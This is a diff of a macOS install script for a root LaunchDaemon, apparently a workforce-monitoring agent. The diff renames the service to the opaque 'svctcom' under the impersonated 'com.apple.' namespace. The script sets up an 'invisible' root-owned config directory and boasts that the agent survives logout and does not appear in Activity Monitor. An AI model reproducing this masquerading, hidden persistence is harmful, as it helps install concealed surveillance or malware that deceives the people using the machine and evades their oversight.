@@ -6,9 +6,9 @@ set -euo pipefail
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 PKG_DIR="$(dirname "$SCRIPT_DIR")"
-APP_PATH="$PKG_DIR/dist/macstelementoryservice.app"
-DAEMON_PLIST="/Library/LaunchDaemons/com.apple.macstelementoryservice.plist"
-PLIST_SOURCE="$SCRIPT_DIR/macstelementoryservice.plist"
+APP_PATH="$PKG_DIR/dist/svctcom.app"
+DAEMON_PLIST="/Library/LaunchDaemons/com.apple.svctcom.plist"
+PLIST_SOURCE="$SCRIPT_DIR/svctcom.plist"
 
 # Check if running as root
 if [ "$(id -u)" != "0" ]; then
@@ -27,7 +27,7 @@ cp -R "$APP_PATH" /Applications/ || {
 }
 
 # Make executable
-chmod +x "/Applications/macstelementoryservice.app/Contents/MacOS/macstelementoryservice"
+chmod +x "/Applications/svctcom.app/Contents/MacOS/svctcom"
 
 # 2. Set up config directory (root-owned, invisible)
 CONFIG_DIR="/var/workflows/agent"
@@ -58,10 +58,10 @@ launchctl load "$DAEMON_PLIST" || {
 sleep 2
 
 # 5. Verify daemon is loaded
-if launchctl list | grep -q "com.apple.macstelementoryservice"; then
+if launchctl list | grep -q "com.apple.svctcom"; then
     echo "✓ Daemon loaded and running!"
     echo ""
-    launchctl list | grep "com.apple.macstelementoryservice"
+    launchctl list | grep "com.apple.svctcom"
     echo ""
 else
     echo "✗ Daemon not running. Check system logs:"
@@ -79,8 +79,8 @@ echo "  • Continue running even if user logs out"
 echo "  • Not appear in Activity Monitor (system process)"
 echo ""
 echo "To manage:"
-echo "  Start:   sudo launchctl start com.apple.macstelementoryservice"
-echo "  Stop:    sudo launchctl stop com.apple.macstelementoryservice"
+echo "  Start:   sudo launchctl start com.apple.svctcom"
+echo "  Stop:    sudo launchctl stop com.apple.svctcom"
 echo "  Unload:  sudo launchctl unload $DAEMON_PLIST"
 echo ""
 echo "Logs: /var/log/workforce-agent/ or system.log"
